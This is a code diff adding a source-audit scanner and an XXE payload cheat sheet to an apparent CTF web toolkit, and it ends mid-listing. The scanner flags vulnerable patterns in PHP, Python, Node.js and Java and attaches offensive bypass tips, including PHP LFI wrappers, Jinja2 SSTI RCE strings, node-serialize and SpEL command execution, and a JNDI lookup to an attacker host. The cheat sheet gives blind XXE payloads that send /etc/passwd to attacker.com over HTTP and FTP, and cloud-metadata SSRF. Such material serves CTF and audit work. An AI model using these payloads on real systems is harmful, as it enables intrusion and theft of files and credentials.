@@ -4065,3 +4065,1298 @@ class WebModule:
             lines.append(f"  {p}")
 
         return "\n".join(lines)
+
+    # ========== 源码审计 / Code Audit ==========
+
+    def code_audit(self, source: str = "") -> str:
+        """Multi-language source code audit assistant.
+
+        Detects vulnerability patterns and filter bypass opportunities
+        in PHP, Python, Node.js, and Java source code.
+        """
+        title = t('web.code_audit')
+        if not source.strip():
+            return f"[-] {title}: No source code provided."
+
+        lines_out: list[str] = [f"=== {title} ==="]
+        src_lines = source.split("\n")
+        findings: list[str] = []
+
+        # ---------- Language detection ----------
+        lang = "Unknown"
+
+        is_php = bool(re.search(r'<\?php|\.php\b', source, re.I)) or \
+                 bool(re.search(r'\b(echo|isset|array_merge|empty)\s*\(', source))
+        is_python = bool(re.search(r'^\s*(import |from |def |class )\w', source, re.M))
+        is_node = bool(re.search(r'\b(require\s*\(|module\.exports|const\s+\w+\s*=\s*require)', source)) or \
+                  bool(re.search(r'\b(var|let|const)\s+\w+\s*=', source) and 'function' in source.lower())
+        is_java = bool(re.search(r'\bpublic\s+class\b|\bimport\s+java\.', source))
+
+        if is_php:
+            lang = "PHP"
+        elif is_java:
+            lang = "Java"
+        elif is_python:
+            lang = "Python"
+        elif is_node:
+            lang = "Node.js"
+
+        lines_out.append(f"Language: {lang}\n")
+
+        # Helper: find approximate line number
+        def _find_line(pattern: str, flags=0) -> list[tuple[int, str]]:
+            results = []
+            for idx, ln in enumerate(src_lines, 1):
+                if re.search(pattern, ln, flags):
+                    results.append((idx, ln.strip()))
+            return results
+
+        # ==================== PHP ====================
+        if lang == "PHP":
+            user_input = r'\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)\b'
+
+            # --- Vulnerability patterns ---
+            # LFI
+            for lno, ln in _find_line(r'\b(include|require|include_once|require_once)\s*[\(\s]'):
+                if re.search(user_input, ln):
+                    findings.append(
+                        f"[!] Vulnerability: Local File Inclusion (LFI)\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: High\n"
+                        f"    Bypass tips:\n"
+                        f"      - php://filter/convert.base64-encode/resource=flag.php\n"
+                        f"      - data://text/plain,<?php system('cat /flag');?>\n"
+                        f"      - php://input + POST body with PHP code\n"
+                        f"      - /proc/self/environ (User-Agent injection)\n"
+                        f"      - phar://upload/shell.jpg/shell.php\n"
+                        f"      - Null byte: file.php%00.jpg (PHP < 5.3.4)\n"
+                        f"      - Path truncation: ././././.../.../file (Windows 256 / Linux 4096)"
+                    )
+
+            # RCE
+            rce_funcs = r'\b(eval|system|exec|shell_exec|passthru|popen|proc_open)\s*\('
+            for lno, ln in _find_line(rce_funcs):
+                if re.search(user_input, ln) or re.search(r'\$\w+', ln):
+                    findings.append(
+                        f"[!] Vulnerability: Remote Code Execution (RCE)\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: Critical\n"
+                        f"    Bypass tips:\n"
+                        f"      - Backtick execution: `cmd`\n"
+                        f"      - Dynamic function call: $func = 'system'; $func('id');\n"
+                        f"      - call_user_func / call_user_func_array\n"
+                        f"      - preg_replace with /e modifier (PHP < 7)\n"
+                        f"      - assert() acts as eval in PHP 5\n"
+                        f"      - create_function() + code injection\n"
+                        f"      - array_map / usort / array_filter with callback"
+                    )
+
+            # SQLi
+            sql_funcs = r'\b(mysql_query|mysqli_query|PDO::query|pg_query|sqlite_query)\s*\('
+            for lno, ln in _find_line(sql_funcs):
+                if re.search(r'[\.\$"\']', ln):
+                    findings.append(
+                        f"[!] Vulnerability: SQL Injection (SQLi)\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: High\n"
+                        f"    Bypass tips:\n"
+                        f"      - Union-based: ' UNION SELECT 1,2,3--\n"
+                        f"      - Error-based: ' AND extractvalue(1,concat(0x7e,version()))--\n"
+                        f"      - Time-based: ' AND sleep(5)--\n"
+                        f"      - Stacked queries: '; DROP TABLE--\n"
+                        f"      - Use sqlmap for automated exploitation"
+                    )
+
+            # Deserialization
+            for lno, ln in _find_line(r'\bunserialize\s*\('):
+                if re.search(user_input, ln) or re.search(r'\$\w+', ln):
+                    findings.append(
+                        f"[!] Vulnerability: Insecure Deserialization\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: Critical\n"
+                        f"    Bypass tips:\n"
+                        f"      - Craft POP chain exploiting __destruct / __wakeup / __toString\n"
+                        f"      - __wakeup bypass: modify property count in serialized string (CVE-2016-7124)\n"
+                        f"      - phar:// deserialization without unserialize()\n"
+                        f"      - Use PHPGGC for gadget chain generation"
+                    )
+
+            # File operations
+            file_funcs = r'\b(file_get_contents|file_put_contents|fopen|readfile|fread|fwrite)\s*\('
+            for lno, ln in _find_line(file_funcs):
+                if re.search(user_input, ln) or re.search(r'\$\w+', ln):
+                    findings.append(
+                        f"[!] Vulnerability: Arbitrary File Operation\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: High\n"
+                        f"    Bypass tips:\n"
+                        f"      - php://filter/convert.base64-encode/resource=target\n"
+                        f"      - Path traversal: ../../../etc/passwd\n"
+                        f"      - Null byte (PHP < 5.3.4): file.php%00\n"
+                        f"      - php://input for write operations"
+                    )
+
+            # SSRF
+            for lno, ln in _find_line(r'\b(curl_exec|curl_setopt|file_get_contents)\s*\('):
+                if re.search(user_input, ln) or re.search(r'(url|uri|link|path|src|href)', ln, re.I):
+                    findings.append(
+                        f"[!] Vulnerability: Server-Side Request Forgery (SSRF)\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: High\n"
+                        f"    Bypass tips:\n"
+                        f"      - http://127.0.0.1 / http://0x7f000001\n"
+                        f"      - gopher:// protocol for internal service exploitation\n"
+                        f"      - DNS rebinding attack\n"
+                        f"      - Redirect via 302 to internal URL"
+                    )
+
+            # XSS
+            for lno, ln in _find_line(r'\b(echo|print|print_r|var_dump)\s'):
+                if re.search(user_input, ln) and not re.search(r'htmlspecialchars|htmlentities|strip_tags', ln):
+                    findings.append(
+                        f"[!] Vulnerability: Cross-Site Scripting (XSS)\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: Medium\n"
+                        f"    Bypass tips:\n"
+                        f"      - <script>alert(1)</script>\n"
+                        f"      - <img src=x onerror=alert(1)>\n"
+                        f"      - <svg onload=alert(1)>\n"
+                        f"      - javascript:alert(1) in href"
+                    )
+
+            # --- PHP Filter bypass suggestions ---
+            # strpos
+            for lno, ln in _find_line(r'strpos\s*\('):
+                findings.append(
+                    f"[*] Filter Detected: strpos\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Bypass:\n"
+                    f"      - strpos returns 0 (falsy) when match is at position 0\n"
+                    f"      - !strpos($var,'flag') is TRUE when 'flag' is at position 0\n"
+                    f"      - ?file=flag.php  => strpos returns 0, !0 === true\n"
+                    f"      - stripos vs strpos: case sensitivity difference"
+                )
+
+            # preg_match
+            for lno, ln in _find_line(r'preg_match\s*\('):
+                findings.append(
+                    f"[*] Filter Detected: preg_match\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Bypass:\n"
+                    f"      - PCRE backtrack limit: send very long string (>1000000 chars)\n"
+                    f"        ini pcre.backtrack_limit = 1000000, exceed it => preg_match returns false\n"
+                    f"      - Multiline bypass: %0a (newline) to bypass ^ $ anchors\n"
+                    f"      - Array bypass: pass array instead of string => preg_match returns false\n"
+                    f"      - /m modifier missing: use newline to bypass ^...$ patterns\n"
+                    f"      - Case bypass if /i modifier is missing"
+                )
+
+            # str_replace("../")
+            for lno, ln in _find_line(r'str_replace\s*\(.*\.\./'):
+                findings.append(
+                    f"[*] Filter Detected: str_replace (path traversal filter)\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Bypass:\n"
+                    f"      - Double write: ....// => after replace becomes ../\n"
+                    f"      - ..././ => becomes ../\n"
+                    f"      - URL encoding: %2e%2e%2f or double encoding %252e%252e%252f\n"
+                    f"      - Backslash on Windows: ..\\ instead of ../"
+                )
+
+            # str_replace generic
+            for lno, ln in _find_line(r'str_replace\s*\('):
+                if '../' not in ln:
+                    findings.append(
+                        f"[*] Filter Detected: str_replace\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Bypass:\n"
+                        f"      - Double write: if filtering 'select' => selselectect\n"
+                        f"      - str_replace is NOT recursive by default\n"
+                        f"      - Case bypass: if not using str_ireplace"
+                    )
+
+            # strtolower / strtoupper
+            for lno, ln in _find_line(r'\b(strtolower|strtoupper)\s*\('):
+                findings.append(
+                    f"[*] Filter Detected: strtolower/strtoupper\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Bypass:\n"
+                    f"      - Usually combined with other filters\n"
+                    f"      - Turkish locale trick: i vs I (locale-dependent)\n"
+                    f"      - If filtering after conversion, try mixed case before conversion"
+                )
+
+            # is_numeric
+            for lno, ln in _find_line(r'\bis_numeric\s*\('):
+                findings.append(
+                    f"[*] Filter Detected: is_numeric\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Bypass:\n"
+                    f"      - Hex: 0x61646D696E (is_numeric returns true in PHP 5)\n"
+                    f"      - Scientific notation: 0e123 (useful for hash comparison)\n"
+                    f"      - Whitespace: ' 123' (leading space)\n"
+                    f"      - +/- prefix: +123, -123\n"
+                    f"      - In PHP 7+, hex strings are NOT numeric => use 0e / float notation"
+                )
+
+            # intval
+            for lno, ln in _find_line(r'\bintval\s*\('):
+                findings.append(
+                    f"[*] Filter Detected: intval\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Bypass:\n"
+                    f"      - intval('0x1A') = 0 in PHP 7 (no hex parsing)\n"
+                    f"      - intval('010') = 10 (NOT octal unless base=8)\n"
+                    f"      - intval('123abc') = 123 (truncates at non-numeric)\n"
+                    f"      - Base conversion: intval($var, 0) auto-detects 0x/0b/0o\n"
+                    f"      - Overflow: large integers wrap around\n"
+                    f"      - intval('4476.0') == 4476 but '4476.0' !== '4476'"
+                )
+
+            # addslashes / mysql_real_escape_string
+            for lno, ln in _find_line(r'\b(addslashes|mysql_real_escape_string)\s*\('):
+                findings.append(
+                    f"[*] Filter Detected: addslashes/mysql_real_escape_string\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Bypass:\n"
+                    f"      - Wide-byte injection (GBK charset): %bf%27 => %bf%5c%27 => valid GBK char + '\n"
+                    f"      - SET NAMES gbk / SET character_set_client = gbk\n"
+                    f"      - Use %df%27, %bf%27, %aa%27 etc.\n"
+                    f"      - If charset is UTF-8, wide-byte does not work\n"
+                    f"      - Integer injection: no quotes needed => no escaping"
+                )
+
+            # htmlspecialchars
+            for lno, ln in _find_line(r'\bhtmlspecialchars\s*\('):
+                findings.append(
+                    f"[*] Filter Detected: htmlspecialchars\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Bypass:\n"
+                    f"      - Default only encodes double quotes (ENT_COMPAT)\n"
+                    f"      - Single quote bypass: ' onfocus=alert(1) autofocus '\n"
+                    f"      - Attribute injection if inside tag attribute with single quotes\n"
+                    f"      - Event handler in existing attribute context\n"
+                    f"      - javascript: protocol in href/src (not filtered by htmlspecialchars)\n"
+                    f"      - ENT_QUOTES flag needed to escape both quote types"
+                )
+
+            # escapeshellarg / escapeshellcmd
+            for lno, ln in _find_line(r'\b(escapeshellarg|escapeshellcmd)\s*\('):
+                findings.append(
+                    f"[*] Filter Detected: escapeshellarg/escapeshellcmd\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Bypass:\n"
+                    f"      - escapeshellarg + escapeshellcmd combined: argument injection\n"
+                    f"        escapeshellcmd(escapeshellarg($input)) => can break quoting\n"
+                    f"      - Parameter injection: -option=value forms\n"
+                    f"      - For commands like curl/wget: --output /tmp/shell.php\n"
+                    f"      - For tar: --checkpoint=1 --checkpoint-action=exec=cmd\n"
+                    f"      - Newline injection %0a (escapeshellcmd does not escape newlines)\n"
+                    f"      - Locale-dependent: multi-byte char edge cases"
+                )
+
+            # disable_functions
+            for lno, ln in _find_line(r'disable_functions'):
+                findings.append(
+                    f"[*] Filter Detected: disable_functions\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Bypass:\n"
+                    f"      - LD_PRELOAD + mail()/putenv() / error_log()\n"
+                    f"      - FFI (PHP 7.4+): $ffi = FFI::cdef('int system(const char*);');\n"
+                    f"      - Imagick: convert with delegates (ghostscript etc.)\n"
+                    f"      - imap_open() with -oProxyCommand\n"
+                    f"      - COM object (Windows): new COM('WScript.Shell')\n"
+                    f"      - pcntl_exec if pcntl extension loaded\n"
+                    f"      - PHP Bash ShellShock (CVE-2014-6271)\n"
+                    f"      - Apache mod_cgi + .htaccess"
+                )
+
+            # open_basedir
+            for lno, ln in _find_line(r'open_basedir'):
+                findings.append(
+                    f"[*] Filter Detected: open_basedir\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Bypass:\n"
+                    f"      - glob:// protocol: glob:///* to list root directory\n"
+                    f"      - symlink() to access files outside basedir\n"
+                    f"      - chdir() + ini_set(): chdir('img'); ini_set('open_basedir','..');\n"
+                    f"      - SplFileInfo bypass in some PHP versions\n"
+                    f"      - realpath cache abuse"
+                )
+
+        # ==================== Python ====================
+        if lang == "Python":
+            # SSTI
+            for lno, ln in _find_line(r'\b(render_template_string|Jinja2|Environment|\.format\s*\()'):
+                findings.append(
+                    f"[!] Vulnerability: Server-Side Template Injection (SSTI)\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Risk: Critical\n"
+                    f"    Bypass tips:\n"
+                    f"      - Detection: {{{{7*7}}}} => 49\n"
+                    f"      - Jinja2 RCE: {{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\n"
+                    f"      - {{{{''.__class__.__mro__[1].__subclasses__()}}}}\n"
+                    f"      - {{{{request.application.__globals__.__builtins__.__import__('os').popen('cmd').read()}}}}\n"
+                    f"      - Filter bypass: |attr() filter, request.args, self.__dict__"
+                )
+
+            # RCE
+            for lno, ln in _find_line(r'\b(os\.system|os\.popen|subprocess\.|eval\s*\(|exec\s*\(|__import__)\s*\(?'):
+                findings.append(
+                    f"[!] Vulnerability: Remote Code Execution (RCE)\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Risk: Critical\n"
+                    f"    Bypass tips:\n"
+                    f"      - eval/exec: __builtins__.__import__('os').system('cmd')\n"
+                    f"      - getattr(__builtins__, '__imp'+'ort__')('os')\n"
+                    f"      - Bypass character filter: chr()+chr() to build strings\n"
+                    f"      - importlib.import_module('os')"
+                )
+
+            # Deserialization
+            for lno, ln in _find_line(r'\b(pickle\.loads|yaml\.load|marshal\.loads|shelve\.open)\s*\('):
+                findings.append(
+                    f"[!] Vulnerability: Insecure Deserialization\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Risk: Critical\n"
+                    f"    Bypass tips:\n"
+                    f"      - pickle: craft __reduce__ method for RCE\n"
+                    f"      - yaml.load without Loader=SafeLoader => !!python/object/apply:os.system ['cmd']\n"
+                    f"      - marshal: load crafted bytecode\n"
+                    f"      - Use pickletools.dis() to analyze pickle payloads"
+                )
+
+            # SQLi
+            for lno, ln in _find_line(r'(f["\'].*SELECT.*\{|["\'].*SELECT.*["\']\s*[\+%]|\.format\(.*SELECT|execute\s*\(.*["\']\s*%)', re.I):
+                findings.append(
+                    f"[!] Vulnerability: SQL Injection (SQLi)\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Risk: High\n"
+                    f"    Bypass tips:\n"
+                    f"      - Use parameterized queries: cursor.execute('SELECT * FROM t WHERE id=?', (id,))\n"
+                    f"      - String concatenation/formatting in SQL is always dangerous\n"
+                    f"      - ORM injection: SQLAlchemy text() with user input"
+                )
+
+            # Path traversal
+            for lno, ln in _find_line(r'\b(os\.path\.join|open)\s*\('):
+                if re.search(r'(request\.(args|form|values|data|json|get_json)|input\s*\(|sys\.argv)', ln) or \
+                   re.search(r'\+\s*\w+|f["\']', ln):
+                    findings.append(
+                        f"[!] Vulnerability: Path Traversal\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: High\n"
+                        f"    Bypass tips:\n"
+                        f"      - os.path.join('/safe', '/etc/passwd') => '/etc/passwd' (absolute path overrides)\n"
+                        f"      - ../../../etc/passwd\n"
+                        f"      - URL encoding: %2e%2e%2f\n"
+                        f"      - Use os.path.realpath() + startswith() check for defense"
+                    )
+
+            # SSRF
+            for lno, ln in _find_line(r'\b(requests\.(get|post|put|head|delete|patch|options)|urllib\.(request\.)?urlopen|httpx\.(get|post))\s*\('):
+                if re.search(r'(request\.(args|form|values|data|json|get_json)|input\s*\(|sys\.argv)', ln) or \
+                   re.search(r'\+\s*\w+|f["\']|\{.*\}', ln):
+                    findings.append(
+                        f"[!] Vulnerability: Server-Side Request Forgery (SSRF)\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: High\n"
+                        f"    Bypass tips:\n"
+                        f"      - http://127.0.0.1 / http://0x7f000001\n"
+                        f"      - file:///etc/passwd\n"
+                        f"      - DNS rebinding attack\n"
+                        f"      - IPv6: http://[::1]/"
+                    )
+
+        # ==================== Node.js ====================
+        if lang == "Node.js":
+            user_input_node = r'(req\.(body|query|params|headers)|process\.argv)'
+
+            # RCE
+            for lno, ln in _find_line(r'\b(eval\s*\(|child_process|Function\s*\(|vm\.runInNewContext|vm\.runInThisContext)\s*\(?'):
+                findings.append(
+                    f"[!] Vulnerability: Remote Code Execution (RCE)\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Risk: Critical\n"
+                    f"    Bypass tips:\n"
+                    f"      - eval: require('child_process').execSync('cmd').toString()\n"
+                    f"      - Function constructor: new Function('return process')().mainModule.require('child_process').execSync('id')\n"
+                    f"      - vm escape: this.constructor.constructor('return process')()\n"
+                    f"      - Template literal: `${{require('child_process').execSync('id')}}`"
+                )
+
+            # Prototype Pollution
+            for lno, ln in _find_line(r'\b(merge|extend|defaultsDeep|Object\.assign|_\.set|lodash)\s*\('):
+                findings.append(
+                    f"[!] Vulnerability: Prototype Pollution\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Risk: High\n"
+                    f"    Bypass tips:\n"
+                    f"      - {{\"__proto__\":{{\"isAdmin\":true}}}}\n"
+                    f"      - {{\"constructor\":{{\"prototype\":{{\"isAdmin\":true}}}}}}\n"
+                    f"      - Pollution to RCE via EJS/Pug/Handlebars gadgets\n"
+                    f"      - qs library: a[__proto__][b]=c"
+                )
+
+            # Path Traversal
+            for lno, ln in _find_line(r'\b(path\.join|fs\.(readFile|readFileSync|writeFile|createReadStream))\s*\('):
+                if re.search(user_input_node, ln) or re.search(r'\+\s*\w+|`\$\{', ln):
+                    findings.append(
+                        f"[!] Vulnerability: Path Traversal\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: High\n"
+                        f"    Bypass tips:\n"
+                        f"      - path.join('/safe', '../../../etc/passwd')\n"
+                        f"      - URL encoding: %2e%2e%2f\n"
+                        f"      - Null byte (old Node): file%00.jpg"
+                    )
+
+            # SQLi
+            for lno, ln in _find_line(r'([\+`].*(?:SELECT|INSERT|UPDATE|DELETE)|query\s*\(.*[\+`])'):
+                if re.search(r'(SELECT|INSERT|UPDATE|DELETE)', ln, re.I):
+                    findings.append(
+                        f"[!] Vulnerability: SQL Injection (SQLi)\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: High\n"
+                        f"    Bypass tips:\n"
+                        f"      - Use parameterized queries: connection.query('SELECT * FROM t WHERE id=?', [id])\n"
+                        f"      - Template literal SQL is dangerous\n"
+                        f"      - NoSQL injection: {{$gt: ''}}, {{$ne: null}}"
+                    )
+
+            # Deserialization
+            for lno, ln in _find_line(r'\b(node-serialize|serialize-javascript|cryo|funcster)\b'):
+                findings.append(
+                    f"[!] Vulnerability: Insecure Deserialization\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Risk: Critical\n"
+                    f"    Bypass tips:\n"
+                    f"      - node-serialize: {{\"rce\":\"_$$ND_FUNC$$_function(){{require('child_process').exec('cmd')}}}}\n"
+                    f"      - IIFE: immediately invoked function expression in serialized data"
+                )
+
+            # SSRF
+            for lno, ln in _find_line(r'\b(http\.get|https\.get|axios\.(get|post)|fetch|got\(|node-fetch)\s*\('):
+                if re.search(user_input_node, ln) or re.search(r'\+\s*\w+|`\$\{', ln):
+                    findings.append(
+                        f"[!] Vulnerability: Server-Side Request Forgery (SSRF)\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: High\n"
+                        f"    Bypass tips:\n"
+                        f"      - http://127.0.0.1 / http://0x7f000001\n"
+                        f"      - file:///etc/passwd\n"
+                        f"      - DNS rebinding\n"
+                        f"      - URL parser inconsistency between Node.js url.parse and actual request"
+                    )
+
+        # ==================== Java ====================
+        if lang == "Java":
+            # Deserialization
+            for lno, ln in _find_line(r'\b(ObjectInputStream|readObject|XMLDecoder|Yaml\.load|Hessian|Burlap)\b'):
+                findings.append(
+                    f"[!] Vulnerability: Insecure Deserialization\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Risk: Critical\n"
+                    f"    Bypass tips:\n"
+                    f"      - Use ysoserial to generate gadget chains\n"
+                    f"      - Common chains: CommonsCollections, CommonsBeanutils, C3P0\n"
+                    f"      - URLDNS chain for detection (no dependency required)\n"
+                    f"      - XMLDecoder: embed Runtime.exec in XML\n"
+                    f"      - JDK built-in gadgets: JRMPClient, JRMPListener\n"
+                    f"      - Fastjson: {{\"@type\":\"...\", ...}} for auto-type RCE"
+                )
+
+            # RCE
+            for lno, ln in _find_line(r'\b(Runtime\.getRuntime\(\)\.exec|ProcessBuilder|ScriptEngine\.eval)\s*\(?'):
+                findings.append(
+                    f"[!] Vulnerability: Remote Code Execution (RCE)\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Risk: Critical\n"
+                    f"    Bypass tips:\n"
+                    f"      - Runtime.exec does NOT invoke shell: use String[] cmd array\n"
+                    f"      - ProcessBuilder for complex commands\n"
+                    f"      - JNDI injection: lookup(\"ldap://attacker/Exploit\")\n"
+                    f"      - Expression Language injection"
+                )
+
+            # SQLi
+            for lno, ln in _find_line(r'\b(Statement\s*\.\s*(execute|executeQuery|executeUpdate)|createStatement)\s*\('):
+                if re.search(r'[\+"]', ln):
+                    findings.append(
+                        f"[!] Vulnerability: SQL Injection (SQLi)\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: High\n"
+                        f"    Bypass tips:\n"
+                        f"      - Use PreparedStatement instead of Statement\n"
+                        f"      - String concatenation in SQL query is always vulnerable\n"
+                        f"      - MyBatis: use #{{}} instead of ${{}} for parameters"
+                    )
+
+            # SSRF
+            for lno, ln in _find_line(r'\b(URL\s*\(|openConnection|HttpURLConnection|HttpClient\.send|OkHttpClient|RestTemplate)\b'):
+                findings.append(
+                    f"[!] Vulnerability: Server-Side Request Forgery (SSRF)\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Risk: High\n"
+                    f"    Bypass tips:\n"
+                    f"      - http://127.0.0.1 / http://0x7f000001\n"
+                    f"      - URL.openStream() follows redirects by default\n"
+                    f"      - file:///etc/passwd via URL class\n"
+                    f"      - DNS rebinding / TOCTOU"
+                )
+
+            # XXE
+            for lno, ln in _find_line(r'\b(DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|TransformerFactory|SchemaFactory)\b'):
+                if not re.search(r'setFeature|FEATURE_SECURE_PROCESSING|disallow-doctype-decl', source):
+                    findings.append(
+                        f"[!] Vulnerability: XML External Entity (XXE)\n"
+                        f"    Line ~{lno}: {ln}\n"
+                        f"    Risk: High\n"
+                        f"    Bypass tips:\n"
+                        f"      - <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
+                        f"      - Missing: setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)\n"
+                        f"      - OOB XXE for blind extraction\n"
+                        f"      - XInclude injection as XXE alternative"
+                    )
+
+            # SpEL injection
+            for lno, ln in _find_line(r'\b(SpelExpressionParser|ExpressionParser|StandardEvaluationContext)\b'):
+                findings.append(
+                    f"[!] Vulnerability: Spring Expression Language (SpEL) Injection\n"
+                    f"    Line ~{lno}: {ln}\n"
+                    f"    Risk: Critical\n"
+                    f"    Bypass tips:\n"
+                    f"      - T(java.lang.Runtime).getRuntime().exec('cmd')\n"
+                    f"      - new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()\n"
+                    f"      - Use SimpleEvaluationContext instead of StandardEvaluationContext for defense"
+                )
+
+        # ---------- Output ----------
+        if not findings:
+            lines_out.append("[+] No obvious vulnerability patterns detected.")
+            lines_out.append("    Note: This is a pattern-based scan, not a complete audit.")
+            lines_out.append("    Manual review is still recommended.")
+        else:
+            lines_out.append(f"Found {len(findings)} potential issue(s):\n")
+            for f_item in findings:
+                lines_out.append(f_item)
+                lines_out.append("")
+
+        return "\n".join(lines_out)
+
+    # ========== XXE Payload 速查表 ==========
+
+    def xxe_payload_helper(self, input: str = "") -> str:
+        """XXE (XML External Entity) payload cheat sheet for CTF challenges."""
+        title = t('web.xxe_payload_helper')
+        lines: list[str] = [f"=== {title} ===\n"]
+
+        # 1. Basic file read
+        lines.append("[1] Basic File Read (Classic XXE):")
+        lines.append('  <?xml version="1.0" encoding="UTF-8"?>')
+        lines.append("  <!DOCTYPE foo [")
+        lines.append('    <!ENTITY xxe SYSTEM "file:///etc/passwd">')
+        lines.append("  ]>")
+        lines.append("  <root>&xxe;</root>")
+        lines.append("")
+        lines.append("  # Windows:")
+        lines.append('  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">')
+        lines.append("")
+
+        # 2. PHP protocol read (base64)
+        lines.append("[2] PHP Protocol Read (Base64 encode):")
+        lines.append("  <!DOCTYPE foo [")
+        lines.append('    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.php">')
+        lines.append("  ]>")
+        lines.append("  <root>&xxe;</root>")
+        lines.append("")
+        lines.append("  # Decode: echo '<b64>' | base64 -d")
+        lines.append("")
+
+        # 3. SSRF via XXE
+        lines.append("[3] SSRF via XXE:")
+        lines.append("  <!DOCTYPE foo [")
+        lines.append('    <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">')
+        lines.append("  ]>")
+        lines.append("  <root>&xxe;</root>")
+        lines.append("")
+        lines.append("  # Internal port scan:")
+        lines.append('  <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">  <!-- Redis -->')
+        lines.append('  <!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">  <!-- MySQL -->')
+        lines.append('  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">  <!-- AWS metadata -->')
+        lines.append("")
+
+        # 4. OOB (Out-of-Band) XXE with parameter entities
+        lines.append("[4] OOB XXE (Blind / Out-of-Band):")
+        lines.append("  # Step 1: Host evil.dtd on your server (http://attacker.com/evil.dtd):")
+        lines.append('  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">')
+        lines.append("  <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>\">")
+        lines.append("  %eval;")
+        lines.append("  %exfil;")
+        lines.append("")
+        lines.append("  # Step 2: Send payload referencing external DTD:")
+        lines.append('  <?xml version="1.0"?>')
+        lines.append("  <!DOCTYPE foo [")
+        lines.append('    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">')
+        lines.append("    %dtd;")
+        lines.append("  ]>")
+        lines.append("  <root>test</root>")
+        lines.append("")
+        lines.append("  # FTP OOB (multi-line exfiltration):")
+        lines.append('  <!ENTITY % file SYSTEM "file:///etc/passwd">')
+        lines.append("  <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:21/%file;'>\">")
+        lines.append("  %eval;")
+        lines.append("  %exfil;")
+        lines.append("")
+
+        # 5. Error-based XXE
+        lines.append("[5] Error-Based XXE (data in error message):")
+        lines.append("  # evil.dtd on attacker server:")
+        lines.append('  <!ENTITY % file SYSTEM "file:///etc/passwd">')
+        lines.append("  <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">")
+        lines.append("  %eval;")
+        lines.append("  %error;")
+        lines.append("")
+        lines.append("  # Payload:")
+        lines.append('  <?xml version="1.0"?>')
+        lines.append("  <!DOCTYPE foo [")
+        lines.append('    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">')
+        lines.append("    %dtd;")
+        lines.append("  ]>")
+        lines.append("  <root>test</root>")
+        lines.append("  # The file content appears in the error message about nonexistent path")
+        lines.append("")
+
+        # 6. CDATA bypass
+        lines.append("[6] CDATA Bypass (read XML/HTML files with special chars):")
+        lines.append("  # evil.dtd:")
+        lines.append('  <!ENTITY % file SYSTEM "file:///etc/fstab">')
+        lines.append('  <!ENTITY % start "<![CDATA[">')
+        lines.append('  <!ENTITY % end "]]>">')
+        lines.append("  <!ENTITY % eval \"<!ENTITY &#x25; all '%start;%file;%end;'>\">")
+        lines.append("  %eval;")
+        lines.append("")
+        lines.append("  # Payload:")
+        lines.append('  <?xml version="1.0"?>')
+        lines.append("  <!DOCTYPE foo [")
+        lines.append('    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">')
+        lines.append("    %dtd;")
+        lines.append("  ]>")
+        lines.append("  <root>&all;</root>")
+        lines.append("")
+
+        # 7. Encoding bypass
+        lines.append("[7] Encoding Bypass:")
+        lines.append("  # UTF-16 encoded XML to bypass WAF/filters:")
+        lines.append("  # Convert payload to UTF-16: iconv -f UTF-8 -t UTF-16 payload.xml > payload_utf16.xml")
+        lines.append("")
+        lines.append("  # UTF-7:")
